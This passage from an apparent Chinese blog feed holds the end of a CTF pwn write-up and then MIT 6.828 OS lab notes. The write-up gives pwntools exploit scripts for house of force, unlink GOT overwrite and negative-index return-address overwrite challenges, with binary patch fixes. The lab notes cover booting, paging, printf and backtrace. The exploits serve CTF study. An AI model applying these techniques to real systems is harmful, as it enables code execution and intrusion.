class="number">1</span>)</span><br><span class="line"></span><br><span class="line">onegadget = libc_base+<span class="number">0xebcf1</span></span><br><span class="line"><span class="comment"># edit(3,p64(system_addr))</span></span><br><span class="line">edit(<span class="number">3</span>,p64(onegadget))</span><br><span class="line"><span class="comment"># shell()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序只有一个功能,可以看出malloc的size不限,最多可以制造0x20的堆溢出.且可以得到堆块的地址(mmap的堆块就是libc地址).符合house of force的条件.改下got表就好了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302115399.png"></p><p>覆盖got表的时候可以用one_gadget,看了别的师傅的巧妙布置,覆盖malloc_got为system,然后在size输入binsh字符串的地址.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302114666.png"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ask(<span class="number">0</span>,<span class="number">0x30000</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'on '</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,libc_addr-<span class="number">0x54b970</span>)</span><br><span class="line"></span><br><span class="line">ask(<span class="number">1</span>,<span class="number">0x10</span>,flat([<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0</span>,-<span class="number">1</span>]))</span><br><span class="line">io.recvuntil(<span class="string">'on '</span>)</span><br><span class="line">top = <span class="built_in">int</span>(io.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">ask(<span class="number">2</span>,force(top,e.got[<span class="string">'malloc'</span>]),<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">ask(<span class="number">3</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'4.go away\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'index?'</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">'want'</span>,<span class="built_in">str</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>改0x30为v2就好,记得补nop.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309302130948.png"></p><h2 id="Printf-but-not-fmtstr"><a href="#Printf-but-not-fmtstr" class="headerlink" title="Printf_but_not_fmtstr"></a>Printf_but_not_fmtstr</h2><p>题目名称意义不明.glibc2.36堆题但是partial relro,能改got就改got了.有uaf,堆块限制在0x500-0x900.</p><p>先unsortedbin泄露地址,然后打unlink.</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress()-<span class="number">0x1f6cc0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0x521</span>,<span class="number">0x4040E8</span>-<span class="number">0x18</span>,<span class="number">0x4040E8</span>-<span class="number">0x10</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b'a'</span>*<span class="number">0x10</span>+p64(e.got[<span class="string">'free'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="array-index-bank"><a href="#array-index-bank" class="headerlink" title="array_index_bank"></a>array_index_bank</h2><p>负数索引,泄露pie和栈地址,然后绕过一些检查先改you再改返回地址就行了.</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="string">'-3'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'] = '</span>)</span><br><span class="line">pie_base = p.recvaddress(<span class="string">"int"</span>)-<span class="number">0x14ff</span></span><br><span class="line">lg(<span class="string">"pie_base"</span>,pie_base)</span><br><span class="line"></span><br><span class="line">you = pie_base+<span class="number">0x4010</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="string">'-2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'] = '</span>)</span><br><span class="line">ret_addr = p.recvaddress(<span class="string">"int"</span>)+<span class="number">8</span></span><br><span class="line">stack = ret_addr-<span class="number">0x38</span></span><br><span class="line">lg(<span class="string">"ret"</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>((you-stack)//<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>((ret_addr-stack)//<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">"?"</span>,<span class="built_in">str</span>(pie_base+<span class="number">0x1318</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>改为无符号比较:jle-&gt;jbe</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab1-Lab2</title>
      <link href="/2023/6.828-Lab1-2/"/>
      <url>/2023/6.828-Lab1-2/</url>
      
        <content type="html"><![CDATA[<h1 id="LEC-1"><a href="#LEC-1" class="headerlink" title="LEC 1"></a>LEC 1</h1><h2 id="操作系统概述"><a href="#操作系统概述" class="headerlink" title="操作系统概述"></a>操作系统概述</h2><p>管道本质上是一个内核的缓冲区,大多数情况下半开工,描述符可跨fork继承.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309202328496.png"></p><h2 id="Lab-1-Booting-a-PC"><a href="#Lab-1-Booting-a-PC" class="headerlink" title="Lab 1: Booting a PC"></a>Lab 1: Booting a PC</h2><h3 id="PC-Bootstrap"><a href="#PC-Bootstrap" class="headerlink" title="PC Bootstrap"></a>PC Bootstrap</h3><p>BIOS: 设置中断描述符表,初始化设备.加载bootloader</p><blockquote><p>When the BIOS runs, it sets up an interrupt descriptor table and initializes various devices such as the VGA display. This is where the “Starting SeaBIOS” message you see in the QEMU window comes from. </p></blockquote><span id="more"></span><p>计算机通电后地址设为0xf000:0xfff0,通过一个jmp指令跳转到BIOS的稍前部分</p><blockquote><p>Therefore we shouldn’t be surprised that the first thing that the BIOS does is jmp backwards to an earlier location in the BIOS</p></blockquote><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309211035578.png"></p><h3 id="The-Boot-Loader"><a href="#The-Boot-Loader" class="headerlink" title="The Boot Loader"></a>The Boot Loader</h3><p>BIOS将第一个扇区(引导扇区)加载到物理地址0x7c00~0x7dff的内存中,jmp到0x0000:0x7c00,控制权转移到bootloader.</p><blockquote><p>如果此扇区末尾两个字节分别是魔数0x55和0xaa，则BIOS认为此扇区中存在可执行的程序</p></blockquote><blockquote><p>Floppy and hard disks for PCs are divided into 512 byte regions called sectors. A sector is the disk’s minimum transfer granularity: each read or write operation must be one or more sectors in size and aligned on a sector boundary. If the disk is bootable, the first sector is called the boot sector, since this is where the boot loader code resides. When the BIOS finds a bootable floppy or hard disk, it loads the 512-byte boot sector into memory at physical addresses 0x7c00 through 0x7dff, and then uses a jmp instruction to set the CS:IP to 0000:7c00, passing control to the boot loader. Like the BIOS load address, these addresses are fairly arbitrary - but they are fixed and standardized for PCs.</p></blockquote><p>MBR与bootloader的关系.</p><blockquote><p>MBR是主引导记录（Master Boot Record），也被称为主引导扇区，是计算机开机以后访问硬盘时所必须要读取的第一个扇区。其内部前446字节存储了bootloader代码，其后是4个16字节的“磁盘分区表”。</p></blockquote><h4 id="boot-S流程分析"><a href="#boot-S流程分析" class="headerlink" title="boot.S流程分析"></a>boot.S流程分析</h4><p>.set 相当于define的宏定义</p><p>.code16以16-bit模式产生代码<br>cli(clear interrupt flag),禁止中断发生.</p><blockquote><p> 下面是两条规则：<br>       1）在改变SS：SP之前，必须用cli指令屏蔽中断，然后等操作执行完立即用sti指令恢复<br>       2）SS：SP需要设置在空闲的内存地址，不要建立在其他的程序（尤其是系统的）代码区   </p></blockquote><p>cld(clear direction flag),清除方向标志位,当方向位清除时,字符串操作按递增地址的方式进行.<br>对应的有sti,std(set)</p><p>开启A20 gate:向0x64端口写入0xd1的命令,再向0x60端口写入0xdf(0x11011111)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">seta20.1:</span><br><span class="line">  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">  testb   $0x2,%al</span><br><span class="line">  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">  testb   $0x2,%al</span><br><span class="line">  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">  outb    %al,$0x60</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309211153437.png"></p><p>加载gdt,lgdt 48位内存数据,加载到48位寄存器GDTR,16位的(gdt)段界限,32位的(gdt)段基址<br>gdt初始化内容:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align 2                                # force 4 byte alignment</span><br><span class="line">gdt:</span><br><span class="line">  SEG_NULL# null seg</span><br><span class="line">  SEG(STA_X|STA_R, 0x0, 0xffffffff)# code seg</span><br><span class="line">  SEG(STA_W, 0x0, 0xffffffff)    </span><br></pre></td></tr></tbody></table></figure><p>将%cr0寄存器PE标志置1,长跳转ljmp $PROT_MODE_CSEG, $protcseg以更新cs基地址,正式进入保护模式.</p><p>更新其他段寄存器<br>这里有个点需要注意一下,段选择子的0-1位用来存储RPL,第2位是TI(table indicator)位,用来指示选择子是在GDT(0)还是LDT(1)中,3~15位是13位的段描述符索引值,所以boot.S中定义的0x8和0x10代表的序号其实是1和2.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.set PROT_MODE_CSEG, 0x8         # kernel code segment selector</span><br><span class="line">.set PROT_MODE_DSEG, 0x10        # kernel data segment selector</span><br></pre></td></tr></tbody></table></figure><p>设置esp后便可以调用c代码bootmain.</p><blockquote><p>control starts in boot.S – which sets up protected mode,and a stack so C code then run, then calls bootmain()</p></blockquote><h4 id="boot-main-c流程分析"><a href="#boot-main-c流程分析" class="headerlink" title="(boot)main.c流程分析"></a>(boot)main.c流程分析</h4><p>从扇区1(第二个扇区)的位置开始,从硬盘读取8个扇区(一个页大小)的数据到物理内存0x10000处.这一个页的内容只是ELF文件(Kernel)的部分内容,但至少包含了完整的文件头.接下来便根据程序头表读入程序中的各个段到内存中,(这里的段不是内存中的段,而是硬盘上ELF文件中的各个代码段数据段等),形成内核映像,即真正运行的内核.</p><blockquote><p>内核被加载到内存后,loader还要通过分析其elf结构将其展开到新的位置,所以说,内核在内存中有两份拷贝,一份是elf格式的源文件kernel.bin,另一份是loader解析elf格式的kernel.bin后在内存中生成的内核映像,这个映像才是真正运行的内核.</p></blockquote><p>完成内核的加载后,跳转到ELF头中记录的内核的入口点.0x10000c</p><p>补充一下JOS的磁盘镜像相关内容.JOS的引导盘由两部分组成,boot和kernel,boot位于第一个扇区(引导扇区).所以需要从扇区1开始读取Kernel的ELF文件.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># How to build the kernel disk image</span><br><span class="line">$(OBJDIR)/kern/kernel.img: $(OBJDIR)/kern/kernel $(OBJDIR)/boot/boot</span><br><span class="line">@echo + mk $@</span><br><span class="line">$(V)dd if=/dev/zero of=$(OBJDIR)/kern/kernel.img~ count=10000 2&gt;/dev/null</span><br><span class="line">$(V)dd if=$(OBJDIR)/boot/boot of=$(OBJDIR)/kern/kernel.img~ conv=notrunc 2&gt;/dev/null</span><br><span class="line">$(V)dd if=$(OBJDIR)/kern/kernel of=$(OBJDIR)/kern/kernel.img~ seek=1 conv=notrunc 2&gt;/dev/null</span><br><span class="line">$(V)mv $(OBJDIR)/kern/kernel.img~ $(OBJDIR)/kern/kernel.img</span><br></pre></td></tr></tbody></table></figure><h3 id="The-Kernel"><a href="#The-Kernel" class="headerlink" title="The Kernel"></a>The Kernel</h3><h4 id="entry-S流程分析"><a href="#entry-S流程分析" class="headerlink" title="entry.S流程分析"></a>entry.S流程分析</h4><p>上来第一个指令就看不懂</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movw$0x1234,0x472# warm boot</span><br></pre></td></tr></tbody></table></figure><p>加载页目录表到$cr3(页目录寄存器)<br>$cr0的PG位置1,开启分页模式.<br>初始化堆栈</p><p>开启分页模式后,线性地址的高十位作为页目录表entry_pgdir的索引,中间10位作为页表entry_pgtable的索引.<br>如0xf0100000,页部件先以960为索引在页目录表中找到对应的页表条目,再以256为索引找到页表条目中的物理地址0x100000.<br>理解了这个过程之后再看entrypgdir.c就明白如下映射的原理了:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[KERNBASE, KERNBASE+4MB) --&gt; [0, 4MB) .</span><br><span class="line">[0, 4MB) --&gt; [0, 4MB)</span><br></pre></td></tr></tbody></table></figure><h4 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h4><p>c可变参数的实现机制:<br> va_list args;               // 准备接受参数的列表对象<br> va_start(args, fmt);        // 从…中取出参数到args中，并指定…之前的参数<br> T va_arg（va_list， T）;<br> va_end(args);               // 释放参数列表</p><p>其实就是通过va_start得到固定参数fmt的地址再加上sizeof(fmt)得到第一个参数的地址,之后每次调用va_arg函数获得T类型的参数值,并加sizeof(T)指向下一个参数.</p><p>八进制改改就好了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line"><span class="comment">// Replace this with your code.</span></span><br><span class="line">num = getint(&amp;ap,lflag);</span><br><span class="line"><span class="keyword">if</span>((<span class="type">long</span> <span class="type">long</span>)num &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">putch(<span class="string">'-'</span>,putdat);</span><br><span class="line">num = -(<span class="type">long</span> <span class="type">long</span>)num;</span><br><span class="line">}</span><br><span class="line">base = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">goto</span> number;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><h4 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line"><span class="type">uint32_t</span> ebp = read_ebp();</span><br><span class="line"><span class="type">uint32_t</span> eip = *(<span class="type">uint32_t</span>*)(ebp+<span class="number">4</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">dinfo</span>;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">debuginfo_eip(eip,&amp;dinfo);</span><br><span class="line">cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>,ebp,eip,*(<span class="type">uint32_t</span>*)(ebp+<span class="number">8</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">12</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">16</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">20</span>),*(<span class="type">uint32_t</span>*)(ebp+<span class="number">24</span>));</span><br><span class="line">cprintf(<span class="string">"         %s:%d: %.*s+%d\n"</span>,dinfo.eip_file,dinfo.eip_line,dinfo.eip_fn_namelen,dinfo.eip_fn_name,eip-dinfo.eip_fn_addr);</span><br><span class="line">ebp = *(<span class="type">uint32_t</span>*)(ebp);</span><br><span class="line"><span class="keyword">if</span>(ebp!=<span class="number">0</span>)</span><br><span class="line">eip = *(<span class="type">uint32_t</span>*)(ebp+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实没怎么弄明白.<br><a href="https://sourceware.org/gdb/onlinedocs/stabs.html#Symbol-Tables">https://sourceware.org/gdb/onlinedocs/stabs.html#Symbol-Tables</a><br><a href="https://sourceware.org/gdb/onlinedocs/stabs.html#Line-Numbers">https://sourceware.org/gdb/onlinedocs/stabs.html#Line-Numbers</a></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</span><br><span class="line"><span class="keyword">if</span> (lline &lt;= rline) {</span><br><span class="line">info-&gt;eip_line = stabs[lline].n_desc;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">info-&gt;eip_fn_addr = addr;</span><br><span class="line">lline = lfile;</span><br><span class="line">rline = rfile;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="LEC-3"><a href="#LEC-3" class="headerlink" title="LEC 3"></a>LEC 3</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>先学学pipe的用法.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span>    pipefd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">char</span>   buf;</span><br><span class="line">    <span class="type">pid_t</span>  cpid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s &lt;string&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd) == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    cpid = fork();</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">-1</span>) {</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (cpid == <span class="number">0</span>) {    <span class="comment">/* Child reads from pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Close unused write end */</span></span><br><span class="line">        <span class="keyword">while</span> (read(pipefd[<span class="number">0</span>], &amp;buf, <span class="number">1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">            write(STDOUT_FILENO, &amp;buf, <span class="number">1</span>);</span><br><span class="line">        write(STDOUT_FILENO, <span class="string">"\n"</span>, <span class="number">1</span>);</span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line">        _exit(EXIT_SUCCESS);</span><br><span class="line">    } <span class="keyword">else</span> {            <span class="comment">/* Parent writes argv[1] to pipe */</span></span><br><span class="line">        close(pipefd[<span class="number">0</span>]);          <span class="comment">/* Close unused read end */</span></span><br><span class="line">        write(pipefd[<span class="number">1</span>], argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">        close(pipefd[<span class="number">1</span>]);          <span class="comment">/* Reader will see EOF */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);                <span class="comment">/* Wait for child */</span></span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute cmd.  Never returns.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">runcmd</span><span class="params">(<span class="keyword">struct</span> cmd *cmd)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> p[<span class="number">2</span>], r;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> *<span class="title">ecmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> 